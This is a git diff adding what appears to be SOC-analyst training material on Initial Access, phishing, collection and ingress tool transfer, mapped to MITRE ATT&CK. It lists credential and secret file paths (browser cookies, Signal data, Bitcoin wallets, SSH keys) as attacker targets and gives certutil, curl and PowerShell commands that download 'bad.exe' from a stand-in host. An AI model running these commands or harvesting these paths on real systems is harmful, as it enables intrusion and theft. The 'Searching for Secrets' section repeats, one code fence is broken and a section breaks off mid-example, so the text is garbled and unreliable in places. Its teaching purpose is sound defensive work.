@@ -622,3 +622,367 @@ IF requests to /login.php exceed 5 per minute
 THEN challenge or temporarily block the source IP address
 ```
 
+# Initial Access
+
+## Overview
+
+Imagine the cyber world as a large city filled with skyscrapers and apartments, each protected by its own front door. Threat actors are like criminals roaming the streets and searching for a way inside.
+
+Some attackers may spend weeks attempting to pick the lock of a specific office. Others use brute force, while some try every door until they find one that was accidentally left open.
+
+Regardless of the attacker's final objective, the first step is to gain entry into the target environment. The moment an attacker successfully gains access is known as **Initial Access**.
+
+Initial Access methods can be divided into two main categories:
+
+* Attacks targeting exposed services
+* Attacks relying on human interaction
+
+---
+
+## Exposed Services
+
+Placing a Windows server directly on the Internet is a common requirement for IT teams.
+
+Examples include:
+
+* Corporate websites requiring an open HTTP or HTTPS port.
+* Mail servers requiring an active SMTP port.
+* IT administrators requiring RDP for remote system management.
+* Linux administrators requiring SSH for remote access.
+
+However, every publicly exposed service introduces security risks. Within minutes, an Internet-facing system may be scanned by automated bots looking for:
+
+* Open ports
+* Weak passwords
+* Default credentials
+* Misconfigurations
+* Unpatched vulnerabilities
+* Exposed administration interfaces
+
+If a service is not properly secured, a threat actor may use it to gain Initial Access.
+
+### T1133 — External Remote Services
+
+[**MITRE ATT&CK T1133: External Remote Services**](https://attack.mitre.org/techniques/T1133/) covers attacks against exposed remote-access services.
+
+Commonly targeted services include:
+
+* RDP
+* VNC
+* SSH
+* VPN services
+* Remote administration portals
+
+Threat actors may attempt to gain remote access by exploiting weak passwords, stolen credentials, insecure configurations, or software vulnerabilities.
+
+### T1190 — Exploit Public-Facing Application
+
+[**MITRE ATT&CK T1190: Exploit Public-Facing Application**](https://attack.mitre.org/techniques/T1190/) covers attacks against exposed websites and applications.
+
+Threat actors may target:
+
+* Vulnerable websites
+* Misconfigured web applications
+* Public APIs
+* VPN gateways
+* Email servers
+* File-transfer services
+* Internet-facing management interfaces
+
+Successful exploitation may allow an attacker to execute commands, steal information, upload malware, or gain access to the internal network.
+
+---
+
+## User-Driven Methods
+
+A user workstation may not be directly exposed to the Internet, but attackers can still gain access by convincing the user to perform an unsafe action.
+
+Common examples include:
+
+* Clicking malicious links
+* Opening phishing attachments
+* Enabling malicious document macros
+* Installing pirated software
+* Running fake software updates
+* Connecting unknown USB devices
+* Downloading files from untrusted websites
+* Executing malicious scripts
+
+Because Windows is widely used on employee workstations, SOC analysts frequently investigate user-driven Initial Access alerts.
+
+### T1566 — Phishing
+
+[**MITRE ATT&CK T1566: Phishing**](https://attack.mitre.org/techniques/T1566/) covers techniques that trick users into opening malicious content or revealing sensitive information.
+
+Common phishing methods include:
+
+* Malicious email attachments
+* Links to credential-harvesting websites
+* Fake login pages
+* Malicious documents
+* Social engineering messages
+* Spearphishing campaigns
+
+The attacker relies on the user to execute malware, provide credentials, or perform another action that enables Initial Access.
+
+### T1091 — Replication Through Removable Media
+
+[**MITRE ATT&CK T1091: Replication Through Removable Media**](https://attack.mitre.org/techniques/T1091/) covers the use of removable devices to spread malware.
+
+An attacker may infect a USB device and rely on users to connect it to one or more computers. The malware may then execute automatically or persuade the user to open a malicious file.
+
+---
+
+## Initial Access Categories
+
+| Category | Description | Examples |
+| :--- | :--- | :--- |
+| **Exposed Services** | The attacker targets an Internet-facing service or application. | RDP brute force, VPN credential abuse, vulnerable website exploitation, or SSH attacks. |
+| **User-Driven Methods** | The attacker persuades a user to perform an action that compromises the system. | Phishing attachments, malicious links, pirated software, or infected USB devices. |
+
+---
+
+## Usage by Threat Actors
+
+The popularity of Initial Access techniques changes over time. Some methods become more common, while others decline as technology and security controls evolve.
+
+Threat-intelligence reports such as [Mandiant M-Trends 2025](https://services.google.com/fh/files/misc/m-trends-2025-en.pdf) provide information about modern Initial Access trends.
+
+SOC analysts should understand that threat actors will use any available opportunity to compromise a target.
+
+Major ransomware groups such as:
+
+* [Medusa](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a)
+* [Akira](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a)
+
+have used multiple Initial Access techniques during their campaigns, including exposed-service exploitation, credential abuse, phishing, and other user-driven methods.
+
+# Current State of Phishing
+
+Phishing attacks remain a major threat because they cannot be mitigated as easily as exposed RDP access.
+
+If users have access to the Internet, attackers may use phishing to deliver malware directly to their workstations, bypassing network-perimeter controls.
+
+According to the **HoxHunt Phishing Trends Report for 2025**, phishing attacks increased significantly following the release of ChatGPT in 2022. The success rate of these campaigns also remains high, demonstrating that users continue to fall victim to phishing attacks.
+
+Two phishing techniques that commonly lead to Windows compromises are:
+
+* Malicious binary attachments
+* Malicious LNK attachments
+
+---
+
+## Binary Attachments
+
+Windows supports numerous executable file extensions. Although most users know that untrusted `.exe` files may be dangerous, they may be less cautious with other executable extensions.
+
+Potentially dangerous executable extensions include:
+
+| Extension | File Type |
+| :--- | :--- |
+| **`.exe`** | Windows executable |
+| **`.com`** | Command executable |
+| **`.scr`** | Screen saver executable |
+| **`.cpl`** | Control Panel item |
+| **`.bat`** | Batch script |
+| **`.cmd`** | Command script |
+| **`.msi`** | Windows Installer package |
+| **`.ps1`** | PowerShell script |
+| **`.vbs`** | Visual Basic script |
+| **`.js`** | JavaScript file |
+| **`.lnk`** | Windows shortcut |
+
+All these file types can contain or execute malicious code.
+
+For example, a user may receive an attachment named:
+
+```text
+tryhatme.com
+```
+
+# Searching for Secrets
+
+After exploring a compromised system, identifying its owner, locating valuable information, and discovering its security controls, threat actors begin collecting data that can be sold or used to support their objectives.
+
+This stage involves three MITRE ATT&CK tactics:
+
+* **Collection**
+* **Credential Access**
+* **Exfiltration**
+
+For simplicity, Credential Access can be treated as part of the Collection process.
+
+A threat actor may access a compromised laptop, collect access keys, active web sessions, credentials, and confidential files, place the stolen information into an archive, and exfiltrate it to an attacker-controlled server.
+
+---
+
+## Collection Targets
+
+Collection targets vary depending on the threat actor's objectives.
+
+Some attackers search for:
+
+* Personal photographs
+* Private messages and conversations
+* Browser history
+* Cryptocurrency wallets
+* Gaming accounts
+* Banking sessions
+* Corporate credentials
+* Confidential business information
+* Access to internal networks
+
+Advanced threat groups may compromise an employee's workstation to gain access to a corporate network and prepare for a larger attack, such as ransomware deployment.
+
+Sensitive information is commonly stored in files, but secrets may also be found in:
+
+* The Windows Registry
+* Process memory
+* Browser databases
+* Application configuration files
+* Environment variables
+* Credential stores
+* Active user sessions
+
+---
+
+## Common Collection Targets
+
+```text```
+# Goal: Blackmail the Victim
+# Targets: Photographs, chats, and browser history
+
+C:\Users\<user>\AppData\Roaming\Signal\*
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History
+
+
+# Goal: Steal Money
+# Targets: Online banking sessions and cryptocurrency wallets
+
+C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
+
+
+# Goal: Steal Corporate Data
+# Targets: SSH credentials and databases
+
+C:\Users\<user>\.ssh\*
+C:\Program Files\Microsoft SQL Server\...\DATA\*
+
+# Searching for Secrets
+
+After exploring a compromised system, identifying its owner, locating valuable information, and discovering its security controls, threat actors begin collecting data that can be sold or used to support their objectives.
+
+This stage involves three MITRE ATT&CK tactics:
+
+* **Collection**
+* **Credential Access**
+* **Exfiltration**
+
+For simplicity, Credential Access can be treated as part of the Collection process.
+
+A threat actor may access a compromised laptop, collect access keys, active web sessions, credentials, and confidential files, place the stolen information into an archive, and exfiltrate it to an attacker-controlled server.
+
+---
+
+## Collection Targets
+
+Collection targets vary depending on the threat actor's objectives.
+
+Some attackers search for:
+
+* Personal photographs
+* Private messages and conversations
+* Browser history
+* Cryptocurrency wallets
+* Gaming accounts
+* Banking sessions
+* Corporate credentials
+* Confidential business information
+* Access to internal networks
+
+Advanced threat groups may compromise an employee's workstation to gain access to a corporate network and prepare for a larger attack, such as ransomware deployment.
+
+Sensitive information is commonly stored in files, but secrets may also be found in:
+
+* The Windows Registry
+* Process memory
+* Browser databases
+* Application configuration files
+* Environment variables
+* Credential stores
+* Active user sessions
+
+---
+
+## Common Collection Targets
+
+
+# Goal: Blackmail the Victim
+# Targets: Photographs, chats, and browser history
+
+C:\Users\<user>\AppData\Roaming\Signal\*
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History
+
+
+# Goal: Steal Money
+# Targets: Online banking sessions and cryptocurrency wallets
+
+C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
+
+
+# Goal: Steal Corporate Data
+# Targets: SSH credentials and databases
+
+C:\Users\<user>\.ssh\*
+C:\Program Files\Microsoft SQL Server\...\DATA\*
+
+
+# Ingress Tool Transfer
+
+Attacks do not always begin with fully functional malware. Initial Access may originate from a small phishing attachment or an RDP session that does not contain the tools required for later attack stages.
+
+Threat actors may need to download additional tools after compromising a system.
+
+Examples include:
+
+* A script such as [Seatbelt](https://github.com/GhostPack/Seatbelt) to automate Discovery and identify common vulnerabilities or security weaknesses.
+* A tool such as [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract saved passwords or operating-system credentials.
+* A Remote Access Trojan (RAT) such as [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/) to provide remote control over the compromised system.
+* A ransomware binary to encrypt the system after sensitive data has been stolen.
+
+The process of transferring additional tools or malware to a compromised system is mapped to [**MITRE ATT&CK T1105: Ingress Tool Transfer**](https://attack.mitre.org/techniques/T1105/).
+
+Ingress Tool Transfer is common in real-world breaches. A malicious LNK attachment may use PowerShell to download an additional payload, but threat actors can also transfer files without using PowerShell.
+
+---
+
+## Reasons for Ingress Tool Transfer
+
+Threat actors may avoid placing every required capability inside the initial phishing attachment for several reasons:
+
+* Reduce the size of the initial payload.
+* Bypass antivirus detection by splitting malware into multiple components.
+* Download tools only when they are required.
+* Limit exposure of specialised tools and exploits.
+* Deliver different payloads based on the victim's environment.
+* Avoid revealing the complete attack chain if the initial payload is detected.
+* Update or replace tools during the intrusion.
+
+---
+
+## Common Transfer Methods
+
+| Transfer Method | Common CMD or PowerShell Command |
+| :--- | :--- |
+| **Certutil** | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
+| **Curl — Windows 10 and Later** | `curl.exe https://blackhat.thm/bad.exe -o good.exe` |
+| [**PowerShell Invoke-WebRequest (IWR)**](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
+| **Graphical Interface** | Copy and paste a file through RDP or download it using a web browser. |
+
+### Certutil
+
+```cmd
+certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
+```
